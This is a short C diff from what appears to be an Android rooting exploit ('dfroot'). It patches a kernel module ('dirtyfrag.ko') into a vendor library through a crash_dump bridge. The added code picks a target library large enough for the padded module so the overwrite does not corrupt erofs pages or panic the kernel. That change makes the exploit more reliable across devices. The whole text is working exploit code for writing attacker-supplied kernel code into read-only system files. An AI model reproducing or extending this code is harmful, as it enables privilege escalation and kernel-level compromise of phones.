@@ -564,6 +564,10 @@ static char *pad16(const char *data, size_t len, size_t *out_len) {
 }
 
 
+/* Picks the first existing vendor candidate that can host ko_len bytes plus a
+ * page of slack. Defined in dfroot.c. */
+const char *df_select_ko_target(size_t ko_len);
+
 static int patch_ko(struct Reporter *reporter) {
     /* pick KO image */
     int andr = 0, major = 0, minor = 0;
@@ -611,6 +615,14 @@ static int patch_ko(struct Reporter *reporter) {
     size_t ko_len_padded;
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
     if (!ko_buf) return -1;
+
+    /* Size-gate the host: writing past EOF corrupts erofs tail pages and
+     * panics some kernels (xiaomi 15's libbinderdebug.so is tiny). Pick the
+     * first candidate with room for the blob plus a page of slack. */
+    const char *ko_target = df_select_ko_target(ko_len_padded);
+    strncpy(libcxx_ko_target, ko_target, 63);
+    libcxx_ko_target[63] = '\0';
+    REPORTLN("* ko_target: %s (%zu bytes)", libcxx_ko_target, ko_len_padded);
 
     /* patch #2: write KO into vendor lib via crash_dump bridge */
     REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
